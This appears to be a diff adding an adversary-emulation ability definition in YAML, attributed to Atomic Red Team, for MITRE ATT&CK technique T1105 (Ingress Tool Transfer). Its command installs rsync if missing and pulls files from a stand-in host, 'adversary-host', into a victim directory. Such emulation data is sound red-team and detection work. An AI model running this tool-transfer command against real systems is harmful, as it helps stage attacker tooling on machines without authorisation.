@@ -1,0 +1,53 @@
+- id: 3180f7d5-52c0-4493-9ea0-e3431a84773f
+  name: rsync remote file copy (pull)
+  description: Utilize rsync to perform a remote file copy (pull)
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -x "$(command -v rsync)" ]; then : ; else (pkg install -y rsync)||(sudo
+          apt-get -y install rsync); fi; rsync -r adversary@adversary-host:/tmp/adversary-rsync/
+          /tmp/victim-files'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1105
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_path:
+        description: Path of folder to copy
+        type: path
+        default: /tmp/adversary-rsync/
+      remote_host:
+        description: Remote host to copy from
+        type: string
+        default: adversary-host
+      local_path:
+        description: Local path to receive rsync
+        type: path
+        default: /tmp/victim-files
+      username:
+        description: User account to authenticate on remote host
+        type: string
+        default: adversary
+    dependencies:
+    - description: "rsync must be installed on the machine \n"
+      prereq_command: 'if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1;
+        fi
+
+        '
+      get_prereq_command: '(pkg install -y rsync)||(sudo apt-get -y install rsync)
+
+        '
+    technique_created: '2017-05-31T21:31:16.408Z'
+    atomic_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
+    import_timestamp: '2025-06-24T11:15:56.252935Z'
